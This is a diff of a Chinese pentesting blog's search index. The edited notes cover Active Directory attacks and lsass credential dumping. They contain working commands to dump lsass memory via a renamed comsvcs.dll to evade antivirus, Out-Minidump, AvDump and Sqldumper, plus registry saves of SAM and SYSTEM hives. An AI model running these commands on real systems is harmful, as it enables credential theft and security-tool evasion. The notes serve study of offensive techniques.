@@ -325,7 +325,7 @@
   <entry>
     <title>AD域的攻击方式</title>
     <url>/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</url>
-    <content><![CDATA[<h3 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h3><h3 id="本地组策略-LGP"><a href="#本地组策略-LGP" class="headerlink" title="本地组策略 LGP"></a>本地组策略 LGP</h3><p>简称（Local Group Policy或者Local GPO）</p>
+    <content><![CDATA[<h1 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h1><h3 id="本地组策略-LGP"><a href="#本地组策略-LGP" class="headerlink" title="本地组策略 LGP"></a>本地组策略 LGP</h3><p>简称（Local Group Policy或者Local GPO）</p>
 <p>win+R键打开运行，输入“gpedit.msc”</p>
 <p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220303233218371.png" alt="image-20220303233218371"></p>
 <p>添加对应脚本即可</p>
@@ -358,19 +358,12 @@
 
 
 
-
-
-
-
-
-
-
-
-
-
-<p>参考：<a href="https://xz.aliyun.com/t/9511">https://xz.aliyun.com/t/9511</a></p>
+<h1 id="relay"><a href="#relay" class="headerlink" title="relay"></a>relay</h1><p>参考：<a href="https://xz.aliyun.com/t/9511">https://xz.aliyun.com/t/9511</a></p>
 <h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><p>参考：<a href="https://www.freebuf.com/articles/system/198381.html">https://www.freebuf.com/articles/system/198381.html</a></p>
-<h1 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h1><h1 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h1><h3 id="ZeroLogon-CVE-2020-1472"><a href="#ZeroLogon-CVE-2020-1472" class="headerlink" title="ZeroLogon(CVE-2020-1472)"></a>ZeroLogon(CVE-2020-1472)</h3><h3 id="CVE-2021-42287-and-CVE-2021-42278-只需一个域用户"><a href="#CVE-2021-42287-and-CVE-2021-42278-只需一个域用户" class="headerlink" title="(CVE-2021-42287 and CVE-2021-42278)只需一个域用户"></a>(CVE-2021-42287 and CVE-2021-42278)只需一个域用户</h3><h1 id="Dcsync"><a href="#Dcsync" class="headerlink" title="Dcsync"></a>Dcsync</h1><h3 id="导hash"><a href="#导hash" class="headerlink" title="导hash"></a>导hash</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获得以下任一用户的权限：</span><br><span class="line">Administrators组内的用户</span><br><span class="line">Domain Admins组内的用户</span><br><span class="line">Enterprise Admins组内的用户</span><br><span class="line">域控制器的计算机帐户</span><br></pre></td></tr></table></figure>
+<h1 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h1><h1 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h1><h3 id="ZeroLogon-CVE-2020-1472"><a href="#ZeroLogon-CVE-2020-1472" class="headerlink" title="ZeroLogon(CVE-2020-1472)"></a>ZeroLogon(CVE-2020-1472)</h3><h3 id="CVE-2021-42287-and-CVE-2021-42278-只需一个域用户"><a href="#CVE-2021-42287-and-CVE-2021-42278-只需一个域用户" class="headerlink" title="(CVE-2021-42287 and CVE-2021-42278)只需一个域用户"></a>(CVE-2021-42287 and CVE-2021-42278)只需一个域用户</h3><h1 id="Dcsync"><a href="#Dcsync" class="headerlink" title="Dcsync"></a>Dcsync</h1><h3 id="导hash"><a href="#导hash" class="headerlink" title="导hash"></a>导hash</h3><ul>
+<li>需要获得以下任一用户的权限：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Administrators组内的用户</span><br><span class="line">Domain Admins组内的用户</span><br><span class="line">Enterprise Admins组内的用户</span><br><span class="line">域控制器的计算机帐户</span><br></pre></td></tr></table></figure>
 
 
 
@@ -1583,7 +1576,7 @@
 <h5 id="如何绕过杀软"><a href="#如何绕过杀软" class="headerlink" title="如何绕过杀软"></a>如何绕过杀软</h5><p>cmd下  执行火绒，360，wdf  都报毒，并且还可能没有权限</p>
 <p>powershell下  火绒不报， 360报， wdf 的amsi直接拦截</p>
 <h5 id="绕360和wdf"><a href="#绕360和wdf" class="headerlink" title="绕360和wdf"></a>绕360和wdf</h5><p>参考下面文章，但是2022.3.30这种方法不能绕了，，<br>(<a href="https://mp.weixin.qq.com/s/IA42D6hjvk4Bld65Wahuag">https://mp.weixin.qq.com/s/IA42D6hjvk4Bld65Wahuag</a>)</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy C:\windows\System32\comsvcs.dll bypass360.dll</span><br><span class="line">rundll32.exe bypass360.dll, MiniDump pid lsass.dmp full    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy C:\windows\System32\comsvcs.dll bypass360.dll</span><br><span class="line"></span><br><span class="line">rundll32.exe bypass360.dll, MiniDump pid lsass.dmp full    </span><br></pre></td></tr></table></figure>
 
 
 
@@ -1595,10 +1588,6 @@
 <ul>
 <li>方法肯定很多，这个要分析杀软是怎么进行检测，然后进行对抗绕过。 呜呜呜真的不会其他的</li>
 </ul>
-<h3 id="Out-MiniDump"><a href="#Out-MiniDump" class="headerlink" title="Out-MiniDump"></a>Out-MiniDump</h3><p>Out-MiniDump.ps1 wdf直接杀，而且环境win10下Import-Module 不能执行，可能win server能用吧</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module Out-MiniDump  </span><br><span class="line"></span><br><span class="line">Get-Process lsass | Out-Minidump   </span><br></pre></td></tr></table></figure>
-
-<p>没有成功就补截图了</p>
 <h3 id="AvDump"><a href="#AvDump" class="headerlink" title="AvDump"></a>AvDump</h3><p>我没有搞成功。。。。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AvDump.exe --pid &lt;lsass pid&gt; --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\Users\admin\Desktop\lsass.dmp --min_interval 0</span><br></pre></td></tr></table></figure>
 
@@ -1609,6 +1598,10 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sqldumper.exe &lt;ProcessID&gt; 0 0x01100    完整转储</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220330155608001.png" alt="image-20220330155608001"></p>
+<h1 id="Out-MiniDump"><a href="#Out-MiniDump" class="headerlink" title="Out-MiniDump"></a>Out-MiniDump</h1><p>Out-MiniDump.ps1 wdf直接杀，环境win10下Import-Module 不能执行，可能win server能用吧</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module Out-MiniDump  </span><br><span class="line"></span><br><span class="line">Get-Process lsass | Out-Minidump   </span><br></pre></td></tr></table></figure>
+
+<p>没有成功就不截图了</p>
 <h1 id="3-导出本地SAM-mimikatz"><a href="#3-导出本地SAM-mimikatz" class="headerlink" title="3. 导出本地SAM+mimikatz"></a>3. 导出本地SAM+mimikatz</h1><p>导出本地sam数据库数据，（这个只能获得所有<code>本地用户</code>hash）</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM </span><br></pre></td></tr></table></figure>
 
